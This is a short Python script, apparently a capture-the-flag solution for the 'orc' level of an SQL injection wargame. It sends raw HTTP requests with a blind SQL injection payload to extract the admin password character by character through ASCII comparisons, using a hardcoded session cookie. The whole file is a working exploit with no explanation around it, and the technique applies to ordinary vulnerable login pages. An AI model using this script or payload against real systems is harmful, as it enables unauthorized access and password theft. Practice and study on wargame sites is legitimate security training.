import socket
 
for i in range(1,9):
    for ch in range(48,123):
        if 58 <= ch <= 64: continue
        if 91 <= ch <= 96: continue
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect(('104.27.174.42',80))
 
        header = "GET /chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
        header += "?pw=' or id='admin' and ascii(substr(pw,"+str(i)+",1))="+str(ch)+"%23 "
        header += "HTTP/1.1\r\n"
        header += "Host:los.rubiya.org\r\n"
        header += "Cookie:PHPSESSID=8al87atua9fclucfgn1vvuosb5\r\n"  # 쿠키는 현재 갖고 있는 세션값
        header += "\r\n"
 
        response = ''
    
        sock.send(header.encode())
        response = sock.recv(65535)
        response = response.decode()
        if "Hello admin" in response:
            print(chr(ch),end='',flush=True)
            sock.close()
            break;
        sock.close()
print()

